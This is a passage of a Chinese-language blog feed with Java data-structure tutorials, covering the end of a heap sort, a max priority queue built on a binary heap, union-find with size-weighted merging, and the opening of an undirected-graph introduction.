排序交换后最大元素所在的索引，让它不要参与堆的下沉调整</span></span><br><span class="line">            N --;</span><br><span class="line">            <span class="comment">// 需要对索引1处的元素进行对的下沉调整</span></span><br><span class="line">            sink(heap,<span class="number">1</span>, N);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 把heap中的数据复制到原数组source中</span></span><br><span class="line">        System.arraycopy(heap,<span class="number">1</span>, source,<span class="number">0</span>, source.length);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 根据原数组source，构造出堆heap</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Comparable[] createHeap(Comparable[] source) &#123;</span><br><span class="line"></span><br><span class="line">        Comparable[] heap = <span class="keyword">new</span> <span class="title class_">Comparable</span>[source.length + <span class="number">1</span>];</span><br><span class="line">        <span class="comment">// 把source中的元素拷贝到heap中，heap中的元素就形成一个无序的堆</span></span><br><span class="line">        System.arraycopy(source,<span class="number">0</span>,heap,<span class="number">1</span>,source.length);</span><br><span class="line">        <span class="comment">// 对堆中的元素做下沉调整(从长度的一半处开始，往索引1处扫描)</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (heap.length)/<span class="number">2</span>;i&gt;<span class="number">0</span>;i--)&#123;</span><br><span class="line">            sink(heap,i,heap.length-<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> heap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在heap堆中，对target处的元素做下沉，范围是0~range</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(Comparable[] heap, <span class="type">int</span> target, <span class="type">int</span> range)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="number">2</span> * target &lt;= range)&#123;</span><br><span class="line">            <span class="comment">// 找出当前结点的较大的子结点</span></span><br><span class="line">            <span class="type">int</span> maxIndex;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">2</span>*target+<span class="number">1</span>&lt;=range)&#123;</span><br><span class="line">                <span class="keyword">if</span> (less(heap,<span class="number">2</span>*target,<span class="number">2</span>*target+<span class="number">1</span>))&#123;</span><br><span class="line">                    maxIndex = <span class="number">2</span>*target+<span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    maxIndex = <span class="number">2</span>*target;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                maxIndex = <span class="number">2</span>*target;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//2.比较当前结点的值和较大子结点的值</span></span><br><span class="line">            <span class="keyword">if</span> (!less(heap,target, maxIndex))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            exch(heap,target, maxIndex);</span><br><span class="line">            target = maxIndex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断heap堆中索引i处的元素是否小于索引j处的元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">boolean</span> <span class="title function_">less</span><span class="params">(Comparable[] heap, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> heap[i].compareTo(heap[j]) &lt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 交换heap堆中i索引和j索引处的值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(Comparable[] heap, <span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">Comparable</span> <span class="variable">tmp</span> <span class="operator">=</span> heap[i];</span><br><span class="line">        heap[i] = heap[j];</span><br><span class="line">        heap[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<hr>
<h1 id="三、优先队列"><a href="#三、优先队列" class="headerlink" title="三、优先队列"></a>三、优先队列</h1><p>普通的队列是一种先进先出的数据结构，元素在队列尾追加，而从队列头删除。在某些情况下，我们可能需要找出队列中的最大值或者最小值，例如使用一个队列保存计算机的任务，一般情况下计算机的任务都是有优先级的，我们需要在这些计算机的任务中找出优先级最高的任务先执行，执行完毕后就需要把这个任务从队列中移除。普通的<br>队列要完成这样的功能，需要每次遍历队列中的所有元素，比较并找出最大值，效率不是很高，这个时候，我们就可以使用一种特殊的队列来完成这种需求，<strong>优先队列</strong>。</p>
<blockquote>
<p>优先队列按照其作用不同，可以分为以下两种：</p>
<ul>
<li><strong>最大优先队列：</strong></li>
</ul>
<p>可以获取并删除队列中最大的值</p>
<ul>
<li><strong>最小优先队列：</strong></li>
</ul>
<p>可以获取并删除队列中最小的值</p>
</blockquote>
<h2 id="（1）最大优先队列实现"><a href="#（1）最大优先队列实现" class="headerlink" title="（1）最大优先队列实现"></a>（1）最大优先队列实现</h2><p>这里我们以实现构建最大优先队列为例，最大优先队列就是以大根堆实现的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MaxPriorityQueue</span>&lt;T <span class="keyword">extends</span> <span class="title class_">Comparable</span>&lt;T&gt;&gt; &#123;</span><br><span class="line">    <span class="comment">// 存储堆中的元素</span></span><br><span class="line">    <span class="keyword">private</span> T[] items;</span><br><span class="line">    <span class="comment">// 记录堆中元素的个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> N;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MaxPriorityQueue</span><span class="params">(<span class="type">int</span> capacity)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.items = (T[]) <span class="keyword">new</span> <span class="title class_">Comparable</span>[capacity+<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">this</span>.N = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取队列中元素的个数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">size</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> N;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断队列是否为空</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isEmpty</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> N == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断堆中索引i处的元素是否小于索引j处的元素</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> <span class="title function_">less</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> items[i].compareTo(items[j]) &lt; <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 交换堆中i索引和j索引处的值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">exch</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> j)</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">tmp</span> <span class="operator">=</span> items[i];</span><br><span class="line">        items[i] = items[j];</span><br><span class="line">        items[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 往堆中插入一个元素</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">insert</span><span class="params">(T t)</span> &#123;</span><br><span class="line">        items[++N] = t;</span><br><span class="line">        swim(N);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除堆中最大的元素,并返回这个最大元素</span></span><br><span class="line">    <span class="keyword">public</span> T <span class="title function_">delMax</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">T</span> <span class="variable">max</span> <span class="operator">=</span> items[<span class="number">1</span>];</span><br><span class="line">        exch(<span class="number">1</span>, N);</span><br><span class="line">        N --;</span><br><span class="line">        sink(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用上浮算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">swim</span><span class="params">(<span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(k &gt; <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (less(k / <span class="number">2</span>, k))&#123;</span><br><span class="line">                exch(k / <span class="number">2</span>, k);</span><br><span class="line">            &#125;</span><br><span class="line">            k = k / <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用下沉算法，使索引k处的元素能在堆中处于一个正确的位置</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">sink</span><span class="params">(<span class="type">int</span> k)</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="number">2</span> * k &lt;= N)&#123;</span><br><span class="line">            <span class="type">int</span> maxIndex;</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">2</span> * k + <span class="number">1</span> &lt;= N)&#123;</span><br><span class="line">                <span class="keyword">if</span> (less(<span class="number">2</span> * k,<span class="number">2</span> * k + <span class="number">1</span>))&#123;</span><br><span class="line">                    maxIndex = <span class="number">2</span> * k + <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    maxIndex = <span class="number">2</span>*k;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                maxIndex = <span class="number">2</span>*k;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!less(k, maxIndex))&#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            exch(k, maxIndex);</span><br><span class="line">            k = maxIndex;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>最小优先队列就是以小根堆实现，只需更改上述代码的上浮与下沉代码，更改判断结点与父结点、子结点的标准即可。</p>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据结构-并查集</title>
    <url>/posts/78033e99.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>并查集是一种树型的数据结构 ，并查集可以高效地进行如下操作：</p>
<ul>
<li>查询元素p和元素q是否属于同一组</li>
<li>合并元素p和元素q所在的组</li>
</ul>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141958.png" alt="  "></p>
<blockquote>
<p><strong>并查集要求比较简单：</strong></p>
<ol>
<li>每个元素都唯一的对应一个结点；</li>
<li>每一组数据中的多个元素都在同一颗树中；</li>
<li>一个组中的数据对应的树和另外一个组中的数据对应的树之间没有任何联系；</li>
<li>元素在树中并没有子父级关系的硬性要求；</li>
</ol>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142001.png" alt="  "></p>
<hr>
<h1 id="二、并查集"><a href="#二、并查集" class="headerlink" title="二、并查集"></a>二、并查集</h1><h2 id="（1）并查集的简单实现"><a href="#（1）并查集的简单实现" class="headerlink" title="（1）并查集的简单实现"></a>（1）并查集的简单实现</h2><p><strong>并查集API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142003.png" alt="  "></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UF</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录结点元素和该元素所在分组的标识</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] eleAndGroup;</span><br><span class="line">    <span class="comment">// 记录并查集中数据的分组个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化并查集</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UF</span><span class="params">(<span class="type">int</span> N)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化分组的数量,默认情况下，有N个分组</span></span><br><span class="line">        <span class="built_in">this</span>.count = N;</span><br><span class="line">        <span class="comment">// 初始化eleAndGroup数组</span></span><br><span class="line">        <span class="built_in">this</span>.eleAndGroup = <span class="keyword">new</span> <span class="title class_">int</span>[N];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        初始化eleAndGroup中的元素及其所在的组的标识符,</span></span><br><span class="line"><span class="comment">        让eleAndGroup数组的索引作为并查集的每个结点的元素，</span></span><br><span class="line"><span class="comment">        并且让每个索引处的值(该元素所在的组的标识符)就是该索引</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; eleAndGroup.length; i++) &#123;</span><br><span class="line">            eleAndGroup[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前并查集中的数据有多少个分组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">count</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 元素p所在分组的标识符</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> p)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> eleAndGroup[p];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断并查集中元素p和元素q是否在同一分组中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connected</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把p元素所在分组和q元素所在分组合并</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>&#123;</span><br><span class="line">        <span class="comment">// 判断元素q和p是否已经在同一分组中</span></span><br><span class="line">        <span class="comment">// 如果已经在同一分组中，则退出</span></span><br><span class="line">        <span class="keyword">if</span> (connected(p,q))&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找到p所在分组的标识符</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">pGroup</span> <span class="operator">=</span> find(p);</span><br><span class="line">        <span class="comment">// 找到q所在分组的标识符</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">qGroup</span> <span class="operator">=</span> find(q);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 合并组：让p所在组的所有元素的组标识符变为q所在分组的标识符</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; eleAndGroup.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (eleAndGroup[i] == pGroup)&#123;</span><br><span class="line">                eleAndGroup[i] = qGroup;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 分组个数-1</span></span><br><span class="line">        <span class="built_in">this</span>.count--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="（2）算法优化"><a href="#（2）算法优化" class="headerlink" title="（2）算法优化"></a>（2）算法优化</h2><p>上述实现的可以说是最简易版的并查集，如果数据量很大，又要保证两两数据连通，那岂不是要调用 N - 1 次 union 方法。而 union 方法中是通过 for 遍历所有元素来实现合并，所以很明显，我们之前实现的合并算法的时间复杂度是 O(N^2)，如果要解决大规模问题，它是不合适的，所以我们需要对算法进行优化。</p>
<blockquote>
<p><strong>优化思路</strong><br>重新设计<code>find</code>方法和<code>union</code>方法的实现，此时我们先需要对之前定义的数组eleAndGourp的含义进行重新设定：</p>
<ol>
<li>我们仍然让<code>eleAndGroup</code>数组的索引作为某个结点的元素；</li>
<li><code>eleAndGroup[i]</code> 的值不再是当前结点所在的分组标识，而是该结点的父结点；<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815142007.png" alt="  "></li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 元素p所在分组的标识符</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> p)</span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span> (p == eleAndGroup[p])&#123;</span><br><span class="line">			<span class="keyword">return</span> p;</span><br><span class="line">		&#125;</span><br><span class="line">		p = eleAndGroup[p];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把p元素所在分组和q元素所在分组合并</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p,<span class="type">int</span> q)</span>&#123;</span><br><span class="line">	<span class="comment">// 找到p元素和q元素所在组对应的树的根结点</span></span><br><span class="line">	<span class="type">int</span> <span class="variable">pRoot</span> <span class="operator">=</span> find(p);</span><br><span class="line">	<span class="type">int</span> <span class="variable">qRoot</span> <span class="operator">=</span> find(q);</span><br><span class="line">	<span class="comment">// 如果p和q已经在同一分组，则不需要合并了</span></span><br><span class="line">	<span class="keyword">if</span> (pRoot == qRoot)&#123;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 让p所在的树的根结点的父结点为q所在树的根结点即可</span></span><br><span class="line">	eleAndGroup[pRoot] = qRoot;</span><br><span class="line">	<span class="comment">// 组的数量 -1</span></span><br><span class="line">	<span class="built_in">this</span>.count--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>优化后的算法 union 时间复杂度由O(N^2)变为了O(N)。但我们还修改了find算法。我们修改前的find算法的时间复杂度在任何情况下都为O(1)，但修改后的find算法在最坏情况下是O(N)。其最主要的问题在于最坏情况下，树的深度和数组的大小一样，如果我们能够通过一些算法让合并时，生成的树的深度尽可能的小，就可以优化 find 方法。<br>这就可以使用以下提到的<strong>路径压缩</strong>方法。</p>
<h2 id="（3）路径压缩"><a href="#（3）路径压缩" class="headerlink" title="（3）路径压缩"></a>（3）路径压缩</h2><p>之前我们在union算法中，合并树的时候将任意的一棵树连接到了另外一棵树，这种合并方法是比较暴力的，如果我们把并查集中每一棵树的大小记录下来，然后在每次合并树的时候，把较小的树连接到较大的树上，就可以减小树的深度。</p>
<p>只要我们保证每次合并，都能把小树合并到大树上，就能够压缩合并后新树的路径，这样就能提高find方法的效率。为了完成这个需求，我们需要另外一个数组来记录存储每个根结点对应的树中元素的个数，并且需要一些代码调整数组中的值。</p>
<blockquote>
<p><strong>优化思路：</strong></p>
<ol>
<li>新增成员变量 int[] sz:，用以存储每个根结点对应的树中元素的个数</li>
<li>更改 union 方法，以<strong>路径压缩</strong>的思想合并</li>
</ol>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UF</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 记录结点元素和该元素所在分组的标识</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] eleAndGroup;</span><br><span class="line">    <span class="comment">// 记录并查集中数据的分组个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> count;</span><br><span class="line">    <span class="comment">// 用来存储每一个根结点对应的树中保存的结点的个数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span>[] sz;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化并查集</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UF</span><span class="params">(<span class="type">int</span> N)</span>&#123;</span><br><span class="line">        <span class="comment">// 初始化分组的数量,默认情况下，有N个分组</span></span><br><span class="line">        <span class="built_in">this</span>.count = N;</span><br><span class="line">        <span class="comment">// 初始化eleAndGroup数组</span></span><br><span class="line">        <span class="built_in">this</span>.eleAndGroup = <span class="keyword">new</span> <span class="title class_">int</span>[N];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        初始化eleAndGroup中的元素及其所在的组的标识符,</span></span><br><span class="line"><span class="comment">        让eleAndGroup数组的索引作为并查集的每个结点的元素，</span></span><br><span class="line"><span class="comment">        并且让每个索引处的值(该元素所在的组的标识符)就是该索引</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; eleAndGroup.length; i++) &#123;</span><br><span class="line">            eleAndGroup[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.sz = <span class="keyword">new</span> <span class="title class_">int</span>[N];</span><br><span class="line">        <span class="comment">// 默认情况下，sz中每个索引处的值都是1</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sz.length; i++) &#123;</span><br><span class="line">            sz[i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取当前并查集中的数据有多少个分组</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">count</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 元素p所在分组的标识符</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">find</span><span class="params">(<span class="type">int</span> p)</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span> (p == eleAndGroup[p])&#123;</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">            p = eleAndGroup[p];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 判断并查集中元素p和元素q是否在同一分组中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">connected</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> find(p) == find(q);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把p元素所在分组和q元素所在分组合并</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span> p, <span class="type">int</span> q)</span>&#123;</span><br><span class="line">        <span class="comment">// 找到p元素和q元素所在组对应的树的根结点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">pRoot</span> <span class="operator">=</span> find(p);</span><br><span class="line">        <span class="type">int</span> <span class="variable">qRoot</span> <span class="operator">=</span> find(q);</span><br><span class="line">        <span class="comment">// 如果p和q已经在同一分组，则不需要合并了</span></span><br><span class="line">        <span class="keyword">if</span> (pRoot == qRoot)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        判断 pRoot 对应的树大还是 qRoot 对应的树大，</span></span><br><span class="line"><span class="comment">        最终需要把较小的树合并到较大的树中.</span></span><br><span class="line"><span class="comment">        （此处以每棵树的结点数量为大小）</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (sz[pRoot] &lt; sz[qRoot])&#123;</span><br><span class="line">            eleAndGroup[pRoot] = qRoot;</span><br><span class="line">            sz[qRoot] += sz[pRoot];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            eleAndGroup[qRoot] = pRoot;</span><br><span class="line">            sz[pRoot] += sz[qRoot];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 组的数量-1</span></span><br><span class="line">        <span class="built_in">this</span>.count--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Java数据结构-图</title>
    <url>/posts/689338cf.html</url>
    <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p><strong>定义：</strong><br>图是由一组顶点和一组能够将两个顶点相连的边组成的</p>
<hr>
<h1 id="二、无向图"><a href="#二、无向图" class="headerlink" title="二、无向图"></a>二、无向图</h1><p>若E是无向边(简称边)的有限集合时，则图G为无向图。边是顶点的无序对，记为(v, w)或(w,v),因为(v,w)&#x3D;(w,v), 其中v,w是顶点。可以说顶点w和顶点v互为邻接点。边(v, w)依附于顶点w和v，或者说边(v, w)和顶点v, w相关联。<br> <img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141701.png" alt="  "></p>
<p>图所示的无向图G2可表示为<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141704.png" alt="  "></p>
<h2 id="1-相关术语"><a href="#1-相关术语" class="headerlink" title="1. 相关术语"></a>1. 相关术语</h2><p><strong>相邻顶点：</strong></p>
<p>当两个顶点通过一条边相连时，我们称这两个顶点是相邻的，并且称这条边依附于这两个顶点</p>
<p><strong>度：</strong></p>
<p>某个顶点的度就是依附于该顶点的边的个数</p>
<p><strong>子图：</strong></p>
<p>是一幅图的所有边的子集(包含这些边依附的顶点)组成的图</p>
<p><strong>路径：</strong></p>
<p>是由边顺序连接的一系列的顶点组成</p>
<p><strong>环：</strong></p>
<p>是一条至少含有一条边且终点和起点相同的路径</p>
<p><strong>连通图：</strong></p>
<p>如果图中任意一个顶点都存在一条路径到达另外一个顶点，那么这幅图就称之为连通图</p>
<p><strong>连通子图：</strong></p>
<p>一个非连通图由若干连通的部分组成，每一个连通的部分都可以称为该图的连通子图</p>
<h2 id="2-存储结构"><a href="#2-存储结构" class="headerlink" title="2. 存储结构"></a>2. 存储结构</h2><p>要表示一幅图，只需要表示清楚以下两部分内容即可：</p>
<ol>
<li><p>图中所有的顶点</p>
</li>
<li><p>所有连接顶点的边</p>
</li>
</ol>
<p>常见的图的存储结构有两种：邻接矩阵和邻接表</p>
<h3 id="1-邻接矩阵"><a href="#1-邻接矩阵" class="headerlink" title="1.  邻接矩阵"></a>1.  邻接矩阵</h3><ul>
<li><p>使用一个<code>V * V</code>的二维数组<code>int[V][V] adj,</code>把索引的值看做是顶点；</p>
</li>
<li><p>如果顶点v和顶点w相连，我们只需要将<code>adj[v][w]</code>和<code>adj[w][v]</code>的值设置为1,否则设置为0即可。</p>
</li>
</ul>
<p>很明显，邻接矩阵这种存储方式的空间复杂度是V^2的，如果我们处理的问题规模比较大的话，内存空间极有可能不够用。</p>
<h3 id="2-邻接表"><a href="#2-邻接表" class="headerlink" title="2. 邻接表"></a>2. 邻接表</h3><ul>
<li><p>使用一个大小为V的数组 Queue[V] adj，把索引看做是顶点；</p>
</li>
<li><p>每个索引处adj[v]存储了一个队列，该队列中存储的是所有与该顶点相邻的其他顶点</p>
</li>
</ul>
<p>很明显，邻接表的空间并不是是线性级别的，所以大多数情况下都采用邻接表这种存储形式来表示图。</p>
<h2 id="3-无向图的实现"><a href="#3-无向图的实现" class="headerlink" title="3. 无向图的实现"></a>3. 无向图的实现</h2><p><strong>无向图API设计</strong></p>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815141708.png" alt="  "></p>
